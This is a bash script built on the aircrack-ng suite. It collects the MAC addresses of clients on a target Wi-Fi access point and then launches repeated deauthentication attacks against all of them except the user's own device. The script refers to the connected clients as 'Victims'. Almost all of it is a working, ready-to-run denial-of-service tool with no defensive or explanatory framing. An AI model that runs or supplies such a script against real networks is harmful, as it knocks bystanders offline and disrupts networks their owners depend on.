#!/bin/bash

#Author: Amin
#Purpose: To collect mac addresses of clients connected to an access point and deauth unwanted clients on the access point.
#Requirements: aircrack-ng suite

###Declaring all the variables used####
infofile=infodump
macsfile=macs
wlan_interface=wlan1
monitor_interface=mon0
target_station="BSSID of the target station"
ch="Channel Here"
user=`whoami`
mymac="Your mac here"
num_clients=0
count=0
current_interface_num=0
###END of Variables Declaration###


if  [ $user != "root" ]
then
        echo 'Please Run as root'
        exit 0
else
        if [ -e $infofile  ]
        then
                rm ./"$infofile"*
        fi

        echo ">>> Setting up a Monitor mode Interface: $monitor_interface"

        xterm -e airmon-ng start $wlan_interface &

        sleep 4

        ifconfig $wlan_interface down
        iwconfig $wlan_interface channel $ch
        iwconfig $monitor_interface channel $ch

        echo ">>> Starting to dump traffic on the channel $ch"

        xterm -e airodump-ng $monitor_interface --bssid $target_station --channel $ch -w $infofile &

        echo ">>> Waiting for the Victims to connect..."

        sleep 120

        killall airodump-ng

        airmon-ng stop $monitor_interface >> /dev/null

        echo ">>> Collecting Victim(s)' Mac Addresses "

        cat "$infofile"-01.kismet.netxml | grep client-mac | cut -d '<' -f2 | cut -d '>' -f2 > $macsfile
        cat $macsfile | sort -u > temp
        rm $macsfile; mv temp $macsfile
        num_clients=`cat $macsfile | wc -l`

        echo ">>> Starting multiple Monitor mode interfaces"

        sleep 8

        while [ "$count" -lt "$num_clients" ]
        do
                airmon-ng start $wlan_interface >> /dev/null
                count=`expr $count + 1`
        done

        for mac in `cat $macsfile`
        do
                if [ "$mac" != "$mymac" ]
                then
                        xterm -e "while true; do aireplay-ng --deauth 1 -a $target_station -c $mac mon$current_interface_num; sleep 30; done" &
                        current_interface_num=`expr $current_interface_num + 1`
                fi
        done

        echo
        echo
        echo -n "Enter 'quit' to stop the deauth: "; read user_input

        while true
        do
                if [ $user_input =  "quit" ] || [ $user_input = "QUIT" ] || [ $user_input = "Quit" ]
                then
                        killall xterm
                        airmon-ng > temp
                        cat temp | awk '{print $1}' | grep -v Interface | grep -v "^$" > temp2
                        rm temp; mv temp2 temp
                        num=`cat temp | wc -l`
                        count=0

                        while [ $count -lt $num ]
                        do
                                airmon-ng stop mon"$count" >> /dev/null
                                count=`expr $count + 1`
                        done

                        rm ./temp
                        rm ./"$infofile"*

                        break
                fi
        done

fi

#END
